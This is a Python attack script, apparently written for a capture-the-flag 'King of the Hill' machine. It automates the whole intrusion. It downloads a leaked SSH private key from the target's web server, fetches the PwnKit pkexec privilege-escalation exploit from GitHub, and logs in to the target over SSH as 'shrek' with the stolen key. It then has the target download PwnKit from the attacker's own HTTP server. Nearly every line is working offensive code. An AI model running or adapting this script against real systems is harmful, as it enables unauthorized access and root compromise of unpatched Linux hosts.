import http.server
import socketserver
from pwn import *
import os
import shutil
import paramiko
import netifaces

def main():
    #scripts by gatekeep security
    #reference https://github.com/holmes-py/King-of-the-hill#machine-name-food
    #todo: add something to automatically kill the web server, or clean up web server handling
    local_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
    print("Your local IP is: " + local_ip)

    remote_host = input("Please enter remote (target) IP: ")
    remote_host = remote_host.strip()
    print ("The target IP is: " + remote_host)

    #grab the ssh key, 
    grabSSHKey = "wget " + remote_host + "/Cpxtpt2hWCee9VFa.txt"
    os.system(grabSSHKey)

    #setup a web server
    os.system("python -m http.server 8080 &")

    #grab pkexec exploit
    os.system("curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit")
    os.system("chmod +x ./PwnKit")

    #set up private key, and load it into paramiko
    shutil.copyfile("./Cpxtpt2hWCee9VFa.txt", "./id.rsa")
    os.system("chmod 600 id.rsa")

    #set up parameters for SSH
    username = 'shrek'
    key_path = 'id.rsa'
    private_key = paramiko.RSAKey.from_private_key_file(key_path)

    #create an SSH client
    client = paramiko.SSHClient()

    #automatically add the server's host key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #connect to the server using the private key
    client.connect(hostname=remote_host, username=username, pkey=private_key)

    #run a sample command
    stdin, stdout, stderr = client.exec_command('ls')
    print(stdout.read().decode())

    #grab pwnkit from the local_ip
    stdin, stdout, stderr = client.exec_command('wget '+ local_ip + ':8080/PwnKit')
    print(stdout.read().decode())

    #run a new ls to see if the wget worked
    stdin, stdout, stderr = client.exec_command('ls')
    print(stdout.read().decode())

    #close ssh connection
    client.close()

    #clean slate, remove existing files
    os.remove("id.rsa")
    os.remove("Cpxtpt2hWCee9VFa.txt")
    os.remove("PwnKit")

main()